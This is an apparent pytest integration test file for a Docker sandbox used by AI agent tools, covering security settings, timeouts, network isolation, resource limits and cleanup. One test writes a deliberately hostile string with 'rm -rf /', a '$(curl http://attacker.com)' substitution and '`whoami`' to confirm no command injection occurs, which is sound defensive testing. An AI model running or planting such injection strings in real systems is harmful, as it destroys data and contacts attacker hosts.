"""Integration tests for sandbox functionality.

These tests require Docker to be installed and running.
Run with: pytest tests/test_sandbox_integration.py -v
"""

import asyncio
import time

import pytest

pytest_plugins = ("pytest_asyncio",)


@pytest.fixture(scope="session")
def docker_available():
    """Check if Docker is available."""
    try:
        import docker

        client = docker.from_env()
        client.ping()
        return True
    except Exception:
        pytest.skip("Docker not available")


@pytest.mark.integration
@pytest.mark.asyncio
async def test_docker_container_creation(docker_available):
    """Test real Docker container creation and cleanup."""
    from promptise.sandbox import SandboxConfig, SandboxManager

    config = SandboxConfig(backend="docker", image="python:3.11-slim")
    manager = SandboxManager(config)

    # Create session
    session = await manager.create_session()
    assert session is not None
    assert session.container_id is not None

    # Verify container exists and is running
    import docker

    client = docker.from_env()
    container = client.containers.get(session.container_id)
    assert container.status == "running"

    # Verify security settings
    inspect = container.attrs
    assert inspect["HostConfig"]["ReadonlyRootfs"] is True
    assert "no-new-privileges" in str(inspect["HostConfig"]["SecurityOpt"])
    assert inspect["HostConfig"]["NanoCpus"] == 2_000_000_000

    # Cleanup
    await session.cleanup()

    # Verify container is removed
    with pytest.raises(docker.errors.NotFound):
        client.containers.get(session.container_id)


@pytest.mark.integration
@pytest.mark.asyncio
async def test_command_execution(docker_available):
    """Test command execution in sandbox."""
    from promptise.sandbox import SandboxConfig, SandboxManager

    config = SandboxConfig()
    manager = SandboxManager(config)

    async with await manager.create_session() as session:
        # Simple command
        result = await session.execute("echo 'Hello, World!'")
        assert result.success
        assert "Hello, World!" in result.stdout
        assert result.exit_code == 0

        # Command with error
        result = await session.execute("exit 42")
        assert not result.success
        assert result.exit_code == 42

        # Python execution
        result = await session.execute("python -c 'print(2 + 2)'")
        assert result.success
        assert "4" in result.stdout


@pytest.mark.integration
@pytest.mark.asyncio
async def test_command_timeout_enforcement(docker_available):
    """Test that long-running commands are actually killed."""
    from promptise.sandbox import SandboxConfig, SandboxManager

    config = SandboxConfig(timeout=2)
    manager = SandboxManager(config)

    async with await manager.create_session() as session:
        start = time.time()
        result = await session.execute("sleep 60", timeout=2)
        duration = time.time() - start

        # Should timeout in ~2 seconds, not 60
        assert result.timeout is True
        assert duration < 5  # Allow some overhead
        assert result.exit_code == -1
        assert "timed out" in result.stderr.lower()


@pytest.mark.integration
@pytest.mark.asyncio
async def test_file_operations(docker_available):
    """Test file read/write/list operations."""
    from promptise.sandbox import SandboxConfig, SandboxManager

    config = SandboxConfig()
    manager = SandboxManager(config)

    async with await manager.create_session() as session:
        # Write file
        content = "Hello from sandbox!\nLine 2"
        await manager.backend.write_file(session.container_id, "/workspace/test.txt", content)

        # Read file back
        read_content = await manager.backend.read_file(session.container_id, "/workspace/test.txt")
        assert read_content == content

        # List files
        result = await session.execute("ls -la /workspace")
        assert result.success
        assert "test.txt" in result.stdout


@pytest.mark.integration
@pytest.mark.asyncio
async def test_file_write_with_special_characters(docker_available):
    """Test file write with shell metacharacters and injection attempts."""
    from promptise.sandbox import SandboxConfig, SandboxManager

    config = SandboxConfig()
    manager = SandboxManager(config)

    async with await manager.create_session() as session:
        # Test content with dangerous characters
        dangerous_content = """'; rm -rf /; echo 'hacked
$(curl http://attacker.com)
`whoami`
$HOME
Multiple
Lines
With "quotes" and 'apostrophes'
"""

        # Write using Docker API (safe)
        await manager.backend.write_file(
            session.container_id, "/workspace/dangerous.txt", dangerous_content
        )

        # Read back and verify exact match
        read_content = await manager.backend.read_file(
            session.container_id, "/workspace/dangerous.txt"
        )
        assert read_content == dangerous_content

        # Verify no command injection occurred
        result = await session.execute("ls -la /")
        assert result.success
        assert "bin" in result.stdout  # Root dirs still exist


@pytest.mark.integration
@pytest.mark.asyncio
async def test_network_mode_none(docker_available):
    """Test that NONE network mode blocks all network access."""
    from promptise.sandbox import NetworkMode, SandboxConfig, SandboxManager

    config = SandboxConfig(network=NetworkMode.NONE)
    manager = SandboxManager(config)

    async with await manager.create_session() as session:
        # Try to access network - should fail
        result = await session.execute("curl -I https://google.com", timeout=5)
        assert result.exit_code != 0
        assert (
            "Could not resolve host" in result.stderr
            or "Network is unreachable" in result.stderr
            or "Couldn't resolve host" in result.stderr
        )


@pytest.mark.integration
@pytest.mark.asyncio
async def test_network_mode_full(docker_available):
    """Test that FULL network mode allows network access."""
    from promptise.sandbox import NetworkMode, SandboxConfig, SandboxManager

    config = SandboxConfig(network=NetworkMode.FULL)
    manager = SandboxManager(config)

    async with await manager.create_session() as session:
        # Install curl first
        result = await session.execute(
            "apt-get update -qq && apt-get install -y -qq curl", timeout=60
        )

        # Network access should work
        result = await session.execute("curl -I https://google.com", timeout=10)
        # May fail due to DNS or network, but should not be "network unreachable"
        # This test is best-effort since container networking can be complex


@pytest.mark.integration
@pytest.mark.asyncio
async def test_resource_limits_applied(docker_available):
    """Test that CPU and memory limits are applied to container."""
    from promptise.sandbox import SandboxConfig, SandboxManager

    config = SandboxConfig(cpu_limit=1, memory_limit="512M")
    manager = SandboxManager(config)

    async with await manager.create_session() as session:
        # Verify limits in container inspect
        import docker

        client = docker.from_env()
        container = client.containers.get(session.container_id)
        inspect = container.attrs

        # Check CPU limit
        assert inspect["HostConfig"]["NanoCpus"] == 1_000_000_000

        # Check memory limit
        assert inspect["HostConfig"]["Memory"] == 512 * 1024 * 1024

        # Try to exceed memory (should be killed by OOM or fail)
        # This is a soft test since OOM behavior varies
        result = await session.execute(
            "python -c 'x = [0] * (1024**3)'",  # Try to allocate 1GB
            timeout=10,
        )
        # Should fail due to OOM (exit code may vary)


@pytest.mark.integration
@pytest.mark.asyncio
async def test_concurrent_sessions(docker_available):
    """Test creating multiple sandbox sessions concurrently."""
    from promptise.sandbox import SandboxConfig, SandboxManager

    config = SandboxConfig()
    manager = SandboxManager(config)

    # Create 3 sessions concurrently
    sessions = await asyncio.gather(*[manager.create_session() for _ in range(3)])

    assert len(sessions) == 3
    assert len(set(s.container_id for s in sessions)) == 3  # All unique

    # Execute in parallel
    results = await asyncio.gather(*[session.execute("echo 'Session 1'") for session in sessions])

    assert all(r.success for r in results)

    # Cleanup all
    await asyncio.gather(*[session.cleanup() for session in sessions])


@pytest.mark.integration
@pytest.mark.asyncio
async def test_context_manager_cleanup(docker_available):
    """Test that context manager properly cleans up on error."""
    from promptise.sandbox import SandboxConfig, SandboxManager

    config = SandboxConfig()
    manager = SandboxManager(config)

    container_id = None

    try:
        async with await manager.create_session() as session:
            container_id = session.container_id
            # Verify running
            import docker

            client = docker.from_env()
            container = client.containers.get(container_id)
            assert container.status == "running"

            # Simulate error
            raise ValueError("Test error")
    except ValueError:
        pass

    # Verify cleanup happened despite error
    import docker

    client = docker.from_env()
    with pytest.raises(docker.errors.NotFound):
        client.containers.get(container_id)


@pytest.mark.integration
@pytest.mark.asyncio
async def test_sandbox_tools_integration(docker_available):
    """Test that sandbox tools work correctly."""
    from promptise.sandbox import SandboxConfig, SandboxManager
    from promptise.sandbox.tools import create_sandbox_tools

    config = SandboxConfig()
    manager = SandboxManager(config)

    async with await manager.create_session() as session:
        tools = create_sandbox_tools(session)

        # Check all 5 tools are created
        assert len(tools) == 5
        tool_names = {tool.name for tool in tools}
        assert tool_names == {
            "sandbox_exec",
            "sandbox_read_file",
            "sandbox_write_file",
            "sandbox_list_files",
            "sandbox_install_package",
        }

        # Test exec tool
        exec_tool = next(t for t in tools if t.name == "sandbox_exec")
        result = await exec_tool._arun("echo 'test'")
        assert "test" in result
        assert "Exit code: 0" in result

        # Test write tool
        write_tool = next(t for t in tools if t.name == "sandbox_write_file")
        await write_tool._arun(file_path="/workspace/tool_test.txt", content="Tool test")

        # Test read tool
        read_tool = next(t for t in tools if t.name == "sandbox_read_file")
        content = await read_tool._arun(file_path="/workspace/tool_test.txt")
        assert "Tool test" in content

        # Test list tool
        list_tool = next(t for t in tools if t.name == "sandbox_list_files")
        files = await list_tool._arun(directory="/workspace")
        assert "tool_test.txt" in files


@pytest.mark.integration
@pytest.mark.asyncio
async def test_gvisor_backend_if_available(docker_available):
    """Test gVisor backend if runsc runtime is available."""
    import docker

    # Check if gVisor runtime is available
    client = docker.from_env()
    info = client.info()
    runtimes = info.get("Runtimes", {})

    if "runsc" not in runtimes:
        pytest.skip("gVisor (runsc) runtime not available")

    from promptise.sandbox import SandboxConfig, SandboxManager

    config = SandboxConfig(backend="gvisor")
    manager = SandboxManager(config)

    async with await manager.create_session() as session:
        # Verify gVisor runtime is used
        container = client.containers.get(session.container_id)
        inspect = container.attrs
        assert inspect["HostConfig"]["Runtime"] == "runsc"

        # Test command execution
        result = await session.execute("echo 'gVisor test'")
        assert result.success
        assert "gVisor test" in result.stdout
